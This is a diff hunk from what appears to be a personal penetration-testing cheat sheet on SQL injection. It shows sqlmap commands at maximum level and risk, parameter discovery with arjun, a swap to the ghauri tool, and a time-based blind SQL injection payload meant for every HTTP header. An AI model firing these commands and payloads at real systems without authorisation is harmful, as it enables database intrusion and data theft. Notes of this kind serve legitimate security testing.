@@ -873,7 +873,7 @@ SQLI
 	- use sqlmap -m allparams.txt --dbs --batch --level 5 --risk 3 
 	- can check the params from arjun as => https://example.com?hidden_param=value
 	
-3- use goher 
+3- use ghauri => as sqlmap but more advanced 
 
 4- put  1"AND(SELECT1(SELECT(SLEEP(20)))im4x)-- im4x	==> in all headers
 
